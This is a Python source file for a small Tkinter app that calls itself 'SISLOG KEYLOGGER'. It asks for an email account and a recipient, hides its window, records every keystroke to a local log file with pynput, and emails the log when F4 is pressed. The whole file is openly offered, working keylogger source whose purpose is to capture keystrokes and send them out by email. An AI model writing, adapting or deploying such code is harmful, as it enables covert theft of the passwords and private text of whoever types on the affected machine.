# packages
from tkinter import *
from pynput.keyboard import Listener
import sys
import webbrowser
# files project
from smtp import smtp
from validations import validations

class Application:
    def __init__(self, master=None):
        # default values
        self.defaultFont = ("Arial", "10", "bold")
        self.smtpValues = []

        self.title = Frame(master)
        self.title["pady"] = 20
        self.title.pack()

        # containers
        self.firstContainer = Frame(master)
        self.firstContainer["pady"] = 20
        self.firstContainer.pack()

        self.secondContainer = Frame(master)
        self.secondContainer["padx"] = 20
        self.secondContainer.pack()
       
        self.thirdContainer = Frame(master)
        self.thirdContainer["pady"] = 20
        self.thirdContainer.pack()

        self.fourthContainer = Frame(master)
        self.fourthContainer.pack()

        self.fifthContainer = Frame(master)
        self.fifthContainer.pack()
        # end containers

        # widgets
        self.email = Label(self.firstContainer)
        self.email["text"] = "Sender email (optional): "
        self.email["font"] = self.defaultFont
        self.email.pack()
  
        self.password = Label(self.secondContainer)
        self.password["text"] = "Sender password (optional): "
        self.password["font"] = self.defaultFont
        self.password.pack()

        self.recipient = Label(self.thirdContainer)
        self.recipient["text"] = "Sender recipient (optional): "
        self.recipient["font"] = self.defaultFont
        self.recipient.pack()

        self.inputEmail = Entry(self.firstContainer)
        self.inputEmail["width"] = 50
        self.inputEmail["font"] = self.defaultFont
        self.inputEmail.pack()

        self.inputPassword = Entry(self.secondContainer)
        self.inputPassword["width"] = 50
        self.inputPassword["font"] = self.defaultFont
        self.inputPassword["show"] = "*"
        self.inputPassword.pack()

        self.inputRecipient = Entry(self.thirdContainer)
        self.inputRecipient["width"] = 50
        self.inputRecipient["font"] = self.defaultFont
        self.inputRecipient.pack()

        self.startButton = Button(self.fourthContainer)
        self.startButton["text"] = "Start"
        self.startButton["font"] = self.defaultFont
        self.startButton["width"] = 10
        self.startButton["command"] = self.smtpHandler
        self.startButton.pack(side=LEFT)

        self.cancelButton = Button(self.fourthContainer)
        self.cancelButton["text"] = "Cancel"
        self.cancelButton["font"] = self.defaultFont
        self.cancelButton["width"] = 10
        self.cancelButton["command"] = self.cancel
        self.cancelButton.pack(side=LEFT)

        self.helpButton = Button(self.fourthContainer)
        self.helpButton["text"] = "Help"
        self.helpButton["font"] = self.defaultFont
        self.helpButton["width"] = 10
        self.helpButton["command"] = self.help
        self.helpButton.pack(side=LEFT)

        self.title = Label(self.title)
        self.title["text"] = "SISLOG KEYLOGGER"
        self.title["font"] = self.defaultFont
        self.title.pack()

        self.msg = Label(self.fifthContainer)
        self.msg["text"] = ""
        self.msg.pack()
        # end widgets

    # end constructor

    # cancel script if pressed esc
    def cancel(self):
        exit()

    # start keylogger
    def write_log(self, key):
        keydata = str(key)

        # manage keys
        if keydata == "Key.esc":
            self.cancel()
        elif keydata == "Key.f4":
            self.callSmtp()

        # translate keys for log file
        translate_keys = {
            "Key.space": " ",
            "Key.backspace": "-1",
            "Key.ctrl_l": "",
            "Key.ctrl_r": "",
            "Key.shift": "",
            "Key.enter": "\n",
            "Key.alt": "",
            "Key.esc": "",
            "Key.cmd": "",
            "Key.caps_lock": "",
            "Key.tab": "",
            "_l": ""
        }

        # remove quotes
        keydata = keydata.replace("'", "")

        # replaces with the translated information
        for key in translate_keys:
            keydata = keydata.replace(key, translate_keys[key])

        # create file with log information
        with open("tmp/log.txt", "a") as f:
            f.write(keydata)

        # end write_log

    def windowDestroy(self):
         window.destroy()

    def startKeyLogger(self):
        with Listener(on_press=self.write_log) as l:
            l.join()

    def smtpHandler(self):
        values = []

        values.append(self.inputEmail.get())
        values.append(self.inputRecipient.get())
        values.append(self.inputPassword.get())

        self.windowDestroy()

        self.smtpValues = values

        self.startKeyLogger()

    def callSmtp(self):
        smtp.send_email(self.smtpValues)

    def help(self):
        webbrowser.open('https://github.com/YtaloCampos/sislog-keylogger/blob/master/README.md')


# tkinter
window = Tk()
window.title("Sislog")
window.resizable(False, False)
window.iconbitmap('icons/icon_key.ico')
Application(window)
window.mainloop()